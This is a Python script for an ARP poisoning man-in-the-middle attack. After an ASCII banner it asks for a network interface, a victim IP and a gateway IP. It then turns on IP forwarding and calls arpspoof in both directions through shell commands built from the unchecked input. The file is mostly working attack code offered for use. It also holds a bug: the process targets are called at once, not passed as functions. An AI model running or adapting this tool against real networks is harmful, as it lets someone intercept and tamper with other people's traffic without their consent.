import subprocess
from subprocess import call
from multiprocessing import Process


def toggle_ip_forwarding(b: bool):
    """
        #Toggles systems ip forwarding on or off.
        (toggling currently not implemented)

        :param b: bool
    """
    # TODO add toggle functionality
    if b:
        call(["sysctl -w net.ipv4.ip_forward=1"], shell=True)
    elif not b:
        call(["sysctl -w net.ipv4.ip_forward=0"], shell=True)


def capture_packet(interface: str, host_ip: str, gateway_ip: str):
    """
        Captures packets from the target address.

        :param interface: str
        :param host_ip: str
        :param gateway_ip: str
    """
    subprocess.call(f"arpspoof -i {interface} -t {host_ip} {gateway_ip}", shell=True)


def redirect_packet(interface: str, host_ip: str, gateway_ip: str):
    """
        Redirects captured packets to the gateway address.

        :param interface: str
        :param host_ip: str
        :param gateway_ip: str
    """
    subprocess.call(f"arpspoof -i {interface} -t {gateway_ip} {host_ip}", shell=True)


def spoof_handler(interface: str, host_ip: str, gateway_ip: str):
    """
        Handles intercepting and redirecting packets from specified host and gateway.

        :param host_ip: str
        :param gateway_ip: str
        :param interface: str
    """
    # Forward packets.
    toggle_ip_forwarding(b=True)

    # Runs the commands in the list.
    proc1 = Process(target=capture_packet(interface, host_ip, gateway_ip))
    proc2 = Process(target=redirect_packet(interface, host_ip, gateway_ip))
    proc1.start()
    proc2.start()


def start_attack():
    """
        Begins the ARP Poisoning attack.
    """
    print("""
 ______ _____      _____           ______   _____   __     
|___  /|____ |    |  _  |          |  _  \ /   \ \ / /  _  
   / /     / /_ __| |/' |          | | | |/ /| |\ V /  (_) 
  / /      \ \ '__|  /| |          | | | / /_| | \ /       
./ /___.___/ / |  \ |_/ /          | |/ /\___  | | |    _  
\_____/\____/|_|   \___/           |___/     |_/ \_/   (_) 
                                                     
  ___  ____________  ______                         
 / _ \ | ___ \ ___ \ | ___ \   (_)                         
/ /_\ \| |_/ / |_/ / | |_/ /__  _ ___  ___  _ __           
|  _  ||    /|  __/  |  __/ _ \| / __|/ _ \| '_ \          
| | | || |\ \| |     | | | (_) | \__ \ (_) | | | |         
\_| |_/\_| \_\_|     \_|  \___/|_|___/\___/|_| |_|         
    """)

    intf: str = input('[+] Enter Target Interface: ')
    victim: str = input('[+] Enter Target IP: ')
    gateway: str = input('[+] Enter Target Default Gateway IP: ')

    toggled: str = input('[+] Begin spoofing? Y/N: ')

    if toggled == "Y" or toggled == "y":
        spoof_handler(interface=intf, host_ip=victim, gateway_ip=gateway)
    else:
        print("Ending process...")


# Entry Point
if __name__ == "__main__":
    start_attack()
